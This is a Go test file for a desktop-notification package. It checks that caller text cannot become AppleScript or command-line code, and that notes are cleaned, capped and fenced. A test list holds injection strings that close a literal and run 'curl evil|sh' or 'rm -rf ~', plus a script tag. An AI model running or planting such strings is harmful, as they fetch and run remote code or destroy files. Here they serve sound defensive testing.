package notify

import (
	"context"
	"runtime"
	"strings"
	"testing"
	"time"
)

// The attack this package is shaped against: a notification body that ends
// up as code because somebody built a script by concatenation. Every one of
// these strings closes a string literal and starts a statement.
var hostile = []string{
	`x" & (do shell script "curl evil|sh") & "`,
	`"; do shell script "rm -rf ~"; "`,
	"end run\ndo shell script \"whoami\"",
	`<b>bold</b> & <script>alert(1)</script>`,
}

func TestTextNeverBecomesPartOfTheScript(t *testing.T) {
	for _, bad := range hostile {
		args, err := argv(Note{Title: "title", Body: bad})
		if err != nil {
			t.Fatal(err)
		}
		for _, a := range args {
			// Every argument is either one of the constants this package
			// wrote or one whole field of the note. What must never exist is
			// an argument that is script *and* caller text at once, which is
			// what concatenation produces.
			if strings.Contains(a, "display notification") && len(a) > len(
				"display notification (item 1 of argv) with title (item 2 of argv)") {
				t.Fatalf("the script argument grew: %q", a)
			}
			if strings.Contains(a, "notification") && strings.Contains(a, "shell script") {
				t.Fatalf("caller text landed inside a script argument: %q", a)
			}
		}
	}
}

func TestTheScriptIsAConstant(t *testing.T) {
	if runtime.GOOS != "darwin" {
		t.Skip("the AppleScript path is darwin's")
	}
	first, err := argv(Note{Title: "a", Body: "b"})
	if err != nil {
		t.Fatal(err)
	}
	second, err := argv(Note{Title: "wildly different", Body: "text entirely"})
	if err != nil {
		t.Fatal(err)
	}
	// Everything except the two trailing operands has to be identical.
	if len(first) != len(second) {
		t.Fatalf("argv length depends on the text: %d vs %d", len(first), len(second))
	}
	for i := 0; i < len(first)-2; i++ {
		if first[i] != second[i] {
			t.Fatalf("argument %d changed with the text: %q vs %q", i, first[i], second[i])
		}
	}
	if first[len(first)-3] != "--" {
		t.Fatal("the operands are not fenced off with --, so a title starting with a dash reads as an option")
	}
}

func TestTheOperandsAreFencedOnEveryPlatform(t *testing.T) {
	// A title beginning with a dash is not hostile, only unlucky — and
	// without the fence it is an unknown option and a notification nobody
	// sees.
	args, err := argv(Note{Title: "-n oops", Body: "body"})
	if err != nil {
		t.Fatal(err)
	}
	fence := -1
	for i, a := range args {
		if a == "--" {
			fence = i
		}
	}
	if fence < 0 || fence >= len(args)-2 {
		t.Fatalf("no -- before the operands: %q", args)
	}
}

func TestCleanFlattensWhatADesktopWouldRender(t *testing.T) {
	for _, tc := range []struct{ in, want string }{
		{"plain text", "plain text"},
		{"two\nlines", "two lines"},
		{"tab\tseparated", "tab separated"},
		{"\x1b[31mred\x1b[0m", "[31mred[0m"},
		{"<b>markup</b>", "(b)markup(/b)"},
		{"a & b", "a and b"},
		{"\x00\x07bell", "bell"},
		{"  padded  ", "padded"},
	} {
		if got := clean(tc.in); got != tc.want {
			t.Errorf("clean(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}

func TestCleanCapsLength(t *testing.T) {
	got := clean(strings.Repeat("é", maxLen*3))
	if n := len([]rune(got)); n > maxLen+1 {
		t.Fatalf("clean returned %d runes, cap is %d", n, maxLen)
	}
	if !strings.HasSuffix(got, "…") {
		t.Fatal("a truncated notification does not say it was truncated")
	}
	// Cut on a rune boundary: a body ending in half a character is how a
	// notification arrives as a mojibake box.
	for _, r := range got {
		if r == '�' {
			t.Fatal("clean cut through a multi-byte rune")
		}
	}
}

func TestATitlelessNoteIsRefused(t *testing.T) {
	if _, err := argv(Note{Body: "no title"}); err == nil {
		t.Fatal("a notification with no title was built")
	}
	// Whitespace and control characters are not a title either: clean runs
	// before the check, or "\n" would pass it and arrive as an empty box.
	if _, err := argv(Note{Title: "\n\t\x00"}); err == nil {
		t.Fatal("a title of nothing but whitespace was accepted")
	}
}

func TestTheCommandLineIsCleanedWhateverTheCallerPassed(t *testing.T) {
	// The cleaning is argv's job, not the caller's: nothing that reaches a
	// notifier may carry a newline, an escape sequence or markup, and a
	// second call site must not have to remember that.
	args, err := argv(Note{
		Title: "rta \x1b[31m— an agent is waiting",
		Body:  "kv.get\nneeds <b>your</b> answer & then some",
	})
	if err != nil {
		t.Fatal(err)
	}
	for _, a := range args {
		if strings.ContainsAny(a, "\n\t\x1b<>&") {
			t.Fatalf("argument %q reached the command line uncleaned", a)
		}
	}
}

func TestSendSaysWhenThereIsNoNotifier(t *testing.T) {
	if Available() {
		t.Skip("this machine has one")
	}
	if err := Send(context.Background(), Note{Title: "hello"}); err == nil {
		t.Fatal("Send reported success with nothing to send with")
	}
}

func TestTheTTLBecomesAnExpiryTheDesktopUnderstands(t *testing.T) {
	if runtime.GOOS == "darwin" {
		t.Skip("macOS notifications live in Notification Centre whatever anybody asks")
	}
	args, err := argv(Note{Title: "t", Body: "b", TTL: 90 * time.Second})
	if err != nil {
		t.Fatal(err)
	}
	if !contains(args, "--expire-time=90000") {
		t.Fatalf("no expiry in %q", args)
	}
}

// Not skipped anywhere: the arithmetic is the same on every platform, and
// it is where a deadline already past turns into a nonsense expiry.
func TestAnExpiryIsAlwaysSomethingADaemonWillAccept(t *testing.T) {
	if got := durationMillis(-time.Hour); got != "1000" {
		t.Fatalf("a past deadline became %q", got)
	}
	if got := durationMillis(30 * 24 * time.Hour); got != "86400000" {
		t.Fatalf("a month became %q", got)
	}
	if got := durationMillis(90 * time.Second); got != "90000" {
		t.Fatalf("90s became %q", got)
	}
}

func contains(ss []string, want string) bool {
	for _, s := range ss {
		if s == want {
			return true
		}
	}
	return false
}
